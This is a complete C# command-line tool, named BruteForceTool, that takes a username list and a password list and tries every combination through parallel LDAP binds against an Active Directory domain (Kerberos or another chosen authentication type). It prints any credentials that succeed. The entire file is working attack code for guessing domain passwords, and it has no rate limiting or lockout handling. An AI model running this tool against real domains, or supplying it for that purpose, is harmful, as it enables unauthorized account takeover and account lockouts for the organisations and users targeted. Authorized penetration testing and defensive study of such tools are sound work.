using System;
using System.DirectoryServices.Protocols;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using CommandLine;
using static System.String;

namespace BruteForceTool
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            var options = new Options();
            var isCommanLineValid = Parser.Default.ParseArgumentsStrict(args, options);
            if (!isCommanLineValid)
            {
                Console.WriteLine("Command line arguments are invalid");
                return;
            }
            var domain = options.Domain.Split('.').First();
            var authType = GetAuthType(options.AuthTypeInput);
            try
            {
                var usersDictionary = File.ReadAllText(options.UsersListPath)
                .Split(new[] { "\r\n" }, StringSplitOptions.None).Select(_ => _.Trim());
                var passwordDictionary = File.ReadAllText(options.PasswordListPath)
                    .Split(new[] { "\r\n" }, StringSplitOptions.None);
                Parallel.ForEach(usersDictionary, (user) =>
                {
                    Parallel.ForEach(passwordDictionary, (pass) =>
                    {
                        if (ValidateCredentials(user, pass, domain, authType))
                        {
                            Console.WriteLine($"Found valid credentials for: {user}, Password: {pass}");
                        }
                    });
                });
            }
            catch (Exception)
            {
                Console.WriteLine("Brute force failed");
            }
        }
        internal class Options
        {
            [Option('u', "users", Required = true,
              HelpText = "Specify users dictionary's path.")]
            public string UsersListPath { get; set; }
            [Option('p', "pass", Required = true,
              HelpText = "Specify passwords dictionary's path.")]
            public string PasswordListPath { get; set; }
            [Option('d', "domain", Required = true,
              HelpText = "Specify the domain name")]
            public string Domain { get; set; }
            [Option('a', "authentication", Required = true,
              HelpText = "Specify the authentication protocol")]
            public string AuthTypeInput { get; set; }
        }
        public static string FirstCharToUpper(string input)
        {
            if (IsNullOrEmpty(input))
                throw new ArgumentException("Empty String input");
            return input.First().ToString().ToUpper() + input.Substring(1);
        }
        private static AuthType GetAuthType(string authTypeInput)
        {
            AuthType authType;
            if (!Enum.TryParse(FirstCharToUpper(authTypeInput.ToLower()), out authType))
            {
                authType = AuthType.Kerberos;
            }
            return authType;
        }
        private static bool ValidateCredentials(string username, string password,string domain, AuthType authType)
        {
            var credentials
                = new NetworkCredential(username, password, domain);
            var id = new LdapDirectoryIdentifier(domain);
            using (var connection = new LdapConnection(id, credentials, authType))
            {
                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                try
                {
                    connection.Bind();
                }
                catch (LdapException)
                {
                    return false;
                }
                return true;
            }
        }
    }
}
